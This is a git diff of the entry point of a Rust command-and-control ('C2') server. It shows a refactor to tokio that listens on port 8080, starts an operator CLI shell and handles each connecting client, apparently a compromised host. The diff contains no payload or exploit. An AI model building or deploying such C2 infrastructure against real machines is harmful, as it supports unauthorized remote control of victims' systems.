@@ -1,56 +1,55 @@
-use std::io::Write;
+mod client;
+mod terminal;
+
 use std::net::TcpListener;
-use std::{io, thread};
-use crate::handler::utils::{handle_client,
-                            server};
-use crate::config::ClientManager;
-use crate::handler::heartbeats::{listen_for_heartbeats, monitor_heartbeats};
-mod handler;
-mod config;
+
+use client::ClientManager;
+use terminal::{cli_server, handle_client};
+
 
 /// Entry point for the server application.
 ///
 /// Initializes a TCP server that listens on port 49151, manages client connections,
 /// and spawns threads for various tasks including handling client data, listening for
 /// heartbeats, and monitoring client connections.
-fn main() {
-    let listener = TcpListener::bind("0.0.0.0:49151").unwrap();
-    // println!("[I] Server listening on port 49151");
-    io::stdout().flush().unwrap();
+#[tokio::main]
+async fn main() -> tokio::io::Result<()> {
+    let ip_port = "0.0.0.0:8080";
+    let listener = TcpListener::bind(ip_port).unwrap();
 
+    println!("[I] Server listening on {}", ip_port);
+
+    // Client DB
     let client_manager: ClientManager = ClientManager::new();
 
-    // Thread for the C2 Shell
+    // Thread for the C2 CLI Shell
     let server_client_manager_clone = client_manager.clone();
-    thread::spawn(|| server(server_client_manager_clone));
+    tokio::spawn(async move { cli_server(server_client_manager_clone) } );
 
-    // Thread to remove Clients not connected
-    let heartbeat_client_manager_clone = client_manager.clone();
-    thread::spawn(move || {
-        // println!("[I] Monitor heartbeats");
-        monitor_heartbeats(heartbeat_client_manager_clone);
-    });
-
+    // Handle incoming client connections
     for stream in listener.incoming() {
         match stream {
             Ok(stream) => {
                 // Thread that handle the communication with this client
                 let client_manager_clone = client_manager.clone();
-                let ip = stream.peer_addr().unwrap().to_string();
-                thread::spawn(move || {
-                    handle_client(stream, client_manager_clone);
-                });
+                tokio::spawn(async move { handle_client(stream, client_manager_clone) } );
 
-                // Thread that listenes for the heartbeats for this client
-                let listen_heartbeats_client_manager_clone = client_manager.clone();
-                thread::spawn(move || {
-                    listen_for_heartbeats(listen_heartbeats_client_manager_clone, ip)
-                });
             },
             Err(e) => {
                 println!("[E] Error while listening for new connections: {}", e);
             }
         }
     }
+
+    Ok(())
 }
+
+
+
+
+
+
+
+
+
 
